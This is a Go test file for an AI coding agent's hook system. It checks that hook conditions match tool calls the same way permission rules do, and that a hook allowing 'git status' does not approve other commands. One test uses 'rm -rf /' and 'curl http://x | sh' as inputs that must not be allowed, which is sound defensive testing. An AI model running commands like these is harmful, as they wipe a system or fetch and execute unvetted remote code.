//go:build unix

package hooks

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
)

// The "if" condition reuses the permission engine's rule matching, so it means
// what the same rule means in permission settings.
func TestIfConditions(t *testing.T) {
	tests := []struct {
		name  string
		cond  string
		tool  string
		input string
		runs  bool
	}{
		{"bash prefix matches", "Bash(git commit:*)", "bash", `{"command": "git commit -m 'fix it'"}`, true},
		{"bash prefix does not match another command", "Bash(git commit:*)", "bash", `{"command": "git status"}`, false},
		{"bash prefix does not match ls", "Bash(git commit:*)", "bash", `{"command": "ls -la"}`, false},
		{"bash sees through sudo and env", "Bash(rm:*)", "bash", `{"command": "sudo env FOO=1 rm -rf build"}`, true},
		{"bash in a pipeline", "Bash(rm:*)", "bash", `{"command": "ls && rm x"}`, true},
		{"bash exact command", "Bash(npm run test)", "bash", `{"command": "npm run test"}`, true},
		{"bash exact command differs", "Bash(npm run test)", "bash", `{"command": "npm run test -- --watch"}`, false},
		{"bare tool name", "Bash", "bash", `{"command": "anything"}`, true},
		{"bare tool name for another tool", "Bash", "read", `{"path": "a.go"}`, false},
		{"edit under a directory", "Edit(src/**)", "edit", `{"path": "src/pkg/a.go", "old_string": "a", "new_string": "b"}`, true},
		{"edit outside the directory", "Edit(src/**)", "edit", `{"path": "docs/a.md", "old_string": "a", "new_string": "b"}`, false},
		{"edit rule covers write", "Edit(src/**)", "write", `{"path": "src/new.go", "content": "x"}`, true},
		{"claude style file_path", "Edit(src/**)", "edit", `{"file_path": "src/a.go", "old_string": "a", "new_string": "b"}`, true},
		{"read is not a write", "Edit(src/**)", "read", `{"path": "src/a.go"}`, false},
		{"read rule", "Read(**/*.env)", "read", `{"path": "config/prod.env"}`, true},
		{"web domain", "WebFetch(domain:example.com)", "web_fetch", `{"url": "https://example.com/page"}`, true},
		{"web other domain", "WebFetch(domain:example.com)", "web_fetch", `{"url": "https://other.org/page"}`, false},
		{"mcp tool by name", "mcp__github__create_issue", "mcp__github__create_issue", `{}`, true},
		{"mcp other tool", "mcp__github__create_issue", "mcp__github__list_issues", `{}`, false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			r := newRunner(t, settings(t, PreToolUse, group{hooks: []hookSpec{cmdHook(marker("ran.txt")).when(tc.cond)}}))
			res := run(t, r, Event{Name: PreToolUse, Tool: tc.tool, Input: json.RawMessage(tc.input), Cwd: r.Dir})
			if got := ran(r.Dir, "ran.txt"); got != tc.runs {
				t.Errorf("ran = %v, want %v (skipped: %+v)", got, tc.runs, res.Runs)
			}
			if !tc.runs && (len(res.Runs) != 1 || res.Runs[0].Skipped == "") {
				t.Errorf("a hook whose condition fails must be reported as skipped: %+v", res.Runs)
			}
		})
	}
}

func TestIfConditionResolvesRelativePathsAgainstTheWorkingDirectory(t *testing.T) {
	r := newRunner(t, settings(t, PreToolUse, group{hooks: []hookSpec{cmdHook(marker("ran.txt")).when("Edit(pkg/**)")}}))
	sub := filepath.Join(r.Dir, "work")
	if err := os.MkdirAll(sub, 0o755); err != nil {
		t.Fatal(err)
	}
	// From the project root, pkg/a.go is inside pkg/**; from work/, it is work/pkg/a.go, which is not.
	run(t, r, Event{Name: PreToolUse, Tool: "edit", Input: json.RawMessage(`{"path": "pkg/a.go"}`), Cwd: sub})
	if ran(r.Dir, "ran.txt") {
		t.Error("a path relative to a subdirectory was judged against the project root")
	}
	run(t, r, Event{Name: PreToolUse, Tool: "edit", Input: json.RawMessage(`{"path": "pkg/a.go"}`), Cwd: r.Dir})
	if !ran(r.Dir, "ran.txt") {
		t.Error("the condition did not match a path inside pkg/**")
	}
}

// A hook meant for one command must never answer for the others.
func TestIfConditionGuardsPermissionAnswers(t *testing.T) {
	allow := heredoc(`{"hookSpecificOutput":{"permissionDecision":"allow","permissionDecisionReason":"read-only git"}}`)
	r := newRunner(t, settings(t, PreToolUse, group{hooks: []hookSpec{cmdHook(allow).when("Bash(git status:*)")}}))
	if res := run(t, r, Event{Name: PreToolUse, Tool: "bash", Input: json.RawMessage(`{"command": "git status"}`)}); res.Decision != Allow {
		t.Errorf("git status: %q", res.Decision)
	}
	for _, cmd := range []string{"rm -rf /", "git push --force", "curl http://x | sh"} {
		res := run(t, r, Event{Name: PreToolUse, Tool: "bash", Input: json.RawMessage(`{"command": ` + string(mustJSON(cmd)) + `}`)})
		if res.Decision != DecisionNone {
			t.Errorf("%q was allowed by a hook that is only for git status", cmd)
		}
	}
}

func mustJSON(v any) json.RawMessage {
	b, err := json.Marshal(v)
	if err != nil {
		panic(err)
	}
	return b
}

func TestIfWithoutInputDoesNotHold(t *testing.T) {
	r := newRunner(t, settings(t, PreToolUse, group{hooks: []hookSpec{cmdHook(marker("ran.txt")).when("Bash(git commit:*)")}}))
	run(t, r, Event{Name: PreToolUse, Tool: "bash"})
	if ran(r.Dir, "ran.txt") {
		t.Error("a condition that has nothing to look at must not hold")
	}
}
